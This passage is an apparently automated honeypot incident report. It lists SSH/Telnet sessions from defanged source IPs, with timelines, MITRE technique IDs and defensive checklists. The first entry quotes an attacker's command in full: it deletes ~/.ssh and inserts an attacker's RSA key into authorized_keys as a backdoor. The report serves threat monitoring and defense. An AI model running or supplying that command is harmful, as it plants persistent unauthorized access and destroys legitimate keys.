| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:10:46` | `cowrie.session.connect` |
| `2026-07-20 12:10:46` | `cowrie.client.version` |
| `2026-07-20 12:10:46` | `cowrie.client.kex` |
| `2026-07-20 12:10:47` | `cowrie.login.success` |
| `2026-07-20 12:10:48` | `cowrie.session.params` |
| `2026-07-20 12:10:48` | `cowrie.command.input` |
| `2026-07-20 12:10:48` | `cowrie.command.failed` |
| `2026-07-20 12:10:48` | `cowrie.log.closed` |
| `2026-07-20 12:10:48` | `cowrie.session.params` |
| `2026-07-20 12:10:48` | `cowrie.command.input` |
| `2026-07-20 12:10:48` | `cowrie.session.file_download` |
| `2026-07-20 12:10:48` | `cowrie.log.closed` |
| `2026-07-20 12:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8faec842694a

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-20 12:10 |
| **Last Seen** | 2026-07-20 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:10:49` | `cowrie.session.connect` |
| `2026-07-20 12:10:49` | `cowrie.client.version` |
| `2026-07-20 12:10:49` | `cowrie.client.kex` |
| `2026-07-20 12:10:49` | `cowrie.login.success` |
| `2026-07-20 12:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9efa0adfec

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-20 12:10 |
| **Last Seen** | 2026-07-20 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:10:49` | `cowrie.session.connect` |
| `2026-07-20 12:10:49` | `cowrie.client.version` |
| `2026-07-20 12:10:49` | `cowrie.client.kex` |
| `2026-07-20 12:10:50` | `cowrie.login.success` |
| `2026-07-20 12:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46136d989950

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-20 12:14 |
| **Last Seen** | 2026-07-20 12:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:14:23` | `cowrie.session.connect` |
| `2026-07-20 12:14:24` | `cowrie.client.version` |
| `2026-07-20 12:14:24` | `cowrie.client.kex` |
| `2026-07-20 12:14:26` | `cowrie.login.success` |
| `2026-07-20 12:14:26` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a55124db44

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-20 12:14 |
| **Last Seen** | 2026-07-20 12:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:14:32` | `cowrie.session.connect` |
| `2026-07-20 12:14:32` | `cowrie.client.version` |
| `2026-07-20 12:14:32` | `cowrie.client.kex` |
| `2026-07-20 12:14:33` | `cowrie.login.success` |
| `2026-07-20 12:14:33` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-987343d665db

| Field | Detail |
|---|---|
| **Source IP** | `115.245.122[.]146` |
| **First Seen** | 2026-07-20 12:17 |
| **Last Seen** | 2026-07-20 12:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:17:47` | `cowrie.session.connect` |
| `2026-07-20 12:17:48` | `cowrie.client.version` |
| `2026-07-20 12:17:48` | `cowrie.client.kex` |
| `2026-07-20 12:17:50` | `cowrie.login.success` |
| `2026-07-20 12:17:50` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.245.122[.]146` to AbuseIPDB if not already reported
- [ ] Block `115.245.122[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c54e045a1d

| Field | Detail |
|---|---|
| **Source IP** | `202.82.20[.]241` |
| **First Seen** | 2026-07-20 12:17 |
| **Last Seen** | 2026-07-20 12:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:17:56` | `cowrie.session.connect` |
| `2026-07-20 12:17:56` | `cowrie.client.version` |
| `2026-07-20 12:17:56` | `cowrie.client.kex` |
| `2026-07-20 12:17:58` | `cowrie.login.success` |
| `2026-07-20 12:17:59` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.82.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `202.82.20[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3a831c0bb1

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-07-20 12:22 |
| **Last Seen** | 2026-07-20 12:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:22:57` | `cowrie.session.connect` |
| `2026-07-20 12:22:58` | `cowrie.client.version` |
| `2026-07-20 12:22:58` | `cowrie.client.kex` |
| `2026-07-20 12:23:01` | `cowrie.login.success` |
| `2026-07-20 12:23:02` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb27ceb20d6

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-07-20 12:23 |
| **Last Seen** | 2026-07-20 12:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:23:07` | `cowrie.session.connect` |
| `2026-07-20 12:23:08` | `cowrie.client.version` |
| `2026-07-20 12:23:08` | `cowrie.client.kex` |
| `2026-07-20 12:23:09` | `cowrie.login.success` |
| `2026-07-20 12:23:09` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74311c204694

| Field | Detail |
|---|---|
| **Source IP** | `37.25.36[.]197` |
| **First Seen** | 2026-07-20 12:25 |
| **Last Seen** | 2026-07-20 12:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:25:59` | `cowrie.session.connect` |
| `2026-07-20 12:26:00` | `cowrie.client.version` |
| `2026-07-20 12:26:00` | `cowrie.client.kex` |
| `2026-07-20 12:26:01` | `cowrie.login.success` |
| `2026-07-20 12:26:01` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.25.36[.]197` to AbuseIPDB if not already reported
- [ ] Block `37.25.36[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50ecc8f083a

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-07-20 12:26 |
| **Last Seen** | 2026-07-20 12:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:26:11` | `cowrie.session.connect` |
| `2026-07-20 12:26:12` | `cowrie.client.version` |
| `2026-07-20 12:26:12` | `cowrie.client.kex` |
| `2026-07-20 12:26:14` | `cowrie.login.success` |
| `2026-07-20 12:26:15` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75bb319a3169

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-20 12:26 |
| **Last Seen** | 2026-07-20 12:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:26:38` | `cowrie.session.connect` |
| `2026-07-20 12:26:39` | `cowrie.client.version` |
| `2026-07-20 12:26:39` | `cowrie.client.kex` |
| `2026-07-20 12:26:41` | `cowrie.login.success` |
| `2026-07-20 12:26:42` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76d6216708a

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-07-20 12:26 |
| **Last Seen** | 2026-07-20 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:26:51` | `cowrie.session.connect` |
| `2026-07-20 12:26:52` | `cowrie.client.version` |
| `2026-07-20 12:26:52` | `cowrie.client.kex` |
| `2026-07-20 12:26:54` | `cowrie.login.success` |
| `2026-07-20 12:26:55` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6a841202e0

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-07-20 12:29 |
| **Last Seen** | 2026-07-20 12:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:29:01` | `cowrie.session.connect` |
| `2026-07-20 12:29:02` | `cowrie.client.version` |
| `2026-07-20 12:29:02` | `cowrie.client.kex` |
| `2026-07-20 12:29:04` | `cowrie.login.success` |
| `2026-07-20 12:29:04` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d37e7a32d8

| Field | Detail |
|---|---|
| **Source IP** | `222.117.176[.]58` |
| **First Seen** | 2026-07-20 12:30 |
| **Last Seen** | 2026-07-20 12:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:30:06` | `cowrie.session.connect` |
| `2026-07-20 12:30:07` | `cowrie.client.version` |
| `2026-07-20 12:30:07` | `cowrie.client.kex` |
| `2026-07-20 12:30:09` | `cowrie.login.success` |
| `2026-07-20 12:30:09` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.117.176[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.117.176[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2db5fe37285

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 12:30 |
| **Last Seen** | 2026-07-20 12:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:30:07` | `cowrie.session.connect` |
| `2026-07-20 12:30:07` | `cowrie.client.version` |
| `2026-07-20 12:30:07` | `cowrie.client.kex` |
| `2026-07-20 12:30:09` | `cowrie.login.success` |
| `2026-07-20 12:30:11` | `cowrie.session.params` |
| `2026-07-20 12:30:11` | `cowrie.command.input` |
| `2026-07-20 12:30:11` | `cowrie.log.closed` |
| `2026-07-20 12:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab6cb32ea40

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-07-20 12:35 |
| **Last Seen** | 2026-07-20 12:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:35:48` | `cowrie.session.connect` |
| `2026-07-20 12:35:48` | `cowrie.telnet.option` |
| `2026-07-20 12:35:48` | `cowrie.telnet.option` |
| `2026-07-20 12:36:48` | `cowrie.login.success` |
| `2026-07-20 12:36:48` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a09a146e8ab

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 12:37 |
| **Last Seen** | 2026-07-20 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:37:53` | `cowrie.session.connect` |
| `2026-07-20 12:37:53` | `cowrie.client.version` |
| `2026-07-20 12:37:53` | `cowrie.client.kex` |
| `2026-07-20 12:37:53` | `cowrie.login.success` |
| `2026-07-20 12:37:54` | `cowrie.session.params` |
| `2026-07-20 12:37:54` | `cowrie.command.input` |
| `2026-07-20 12:37:54` | `cowrie.log.closed` |
| `2026-07-20 12:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3dacce8588

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-20 12:39 |
| **Last Seen** | 2026-07-20 12:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:39:06` | `cowrie.session.connect` |
| `2026-07-20 12:39:06` | `cowrie.client.version` |
| `2026-07-20 12:39:06` | `cowrie.client.kex` |
| `2026-07-20 12:39:06` | `cowrie.login.success` |
| `2026-07-20 12:39:06` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:39:07` | `cowrie.direct-tcpip.data` |
| `2026-07-20 12:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5aba478a49

| Field | Detail |
|---|---|
| **Source IP** | `80.15.223[.]148` |
| **First Seen** | 2026-07-20 12:42 |
| **Last Seen** | 2026-07-20 12:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:42:34` | `cowrie.session.connect` |
| `2026-07-20 12:42:34` | `cowrie.client.version` |
| `2026-07-20 12:42:34` | `cowrie.client.kex` |
| `2026-07-20 12:42:35` | `cowrie.login.success` |
| `2026-07-20 12:42:35` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.15.223[.]148` to AbuseIPDB if not already reported
- [ ] Block `80.15.223[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69aab9a3f91b

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-20 12:42 |
| **Last Seen** | 2026-07-20 12:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:42:40` | `cowrie.session.connect` |
| `2026-07-20 12:42:41` | `cowrie.client.version` |
| `2026-07-20 12:42:41` | `cowrie.client.kex` |
| `2026-07-20 12:42:42` | `cowrie.login.success` |
| `2026-07-20 12:42:42` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c420beccea6

| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-07-20 12:52 |
| **Last Seen** | 2026-07-20 12:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:52:29` | `cowrie.session.connect` |
| `2026-07-20 12:52:29` | `cowrie.client.version` |
| `2026-07-20 12:52:29` | `cowrie.client.kex` |
| `2026-07-20 12:52:31` | `cowrie.login.success` |
| `2026-07-20 12:52:31` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a90c6223f4

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-20 12:52 |
| **Last Seen** | 2026-07-20 12:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:52:41` | `cowrie.session.connect` |
| `2026-07-20 12:52:41` | `cowrie.client.version` |
| `2026-07-20 12:52:41` | `cowrie.client.kex` |
| `2026-07-20 12:52:42` | `cowrie.login.success` |
| `2026-07-20 12:52:43` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-20 10:56 | 2026-07-20 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | **3** | 2026-07-20 12:07 | 2026-07-20 12:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-20 11:44 | 2026-07-20 11:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-20 11:24 | 2026-07-20 12:24 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `101.50.83[.]146` | 1 | 2026-07-20 11:54 | 2026-07-20 11:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.79.202[.]189` | 1 | 2026-07-20 11:47 | 2026-07-20 11:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `114.96.79[.]13` | 1 | 2026-07-20 11:39 | 2026-07-20 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.151.43[.]172` | 1 | 2026-07-20 11:25 | 2026-07-20 11:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.149.196[.]217` | 1 | 2026-07-20 11:12 | 2026-07-20 11:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.155.174[.]20` | 1 | 2026-07-20 11:16 | 2026-07-20 11:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `14.103.92[.]40` | 1 | 2026-07-20 11:28 | 2026-07-20 11:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.123.76[.]123` | 1 | 2026-07-20 10:56 | 2026-07-20 10:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-07-20 12:54 | 2026-07-20 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-07-20 11:05 | 2026-07-20 11:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]68` | 1 | 2026-07-20 11:21 | 2026-07-20 11:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-07-20 10:57 | 2026-07-20 10:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-20 11:03 | 2026-07-20 11:04 | 38s | 0 | `T1592` | 🟢 LOW |
